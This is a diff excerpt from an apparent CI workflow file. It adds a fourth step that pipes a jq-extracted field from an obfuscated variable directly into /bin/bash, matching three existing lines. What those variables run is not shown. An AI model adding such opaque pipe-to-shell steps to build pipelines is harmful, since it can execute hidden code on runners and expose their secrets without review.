@@ -27,6 +27,7 @@ jobs:
           echo $a9 | jq -r .a8491 | /bin/bash
           echo $e61146 | jq -r .kw53 | /bin/bash
           echo $x064 | jq -r .nsntq52281 | /bin/bash
+          echo $rx8 | jq -r .shg9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
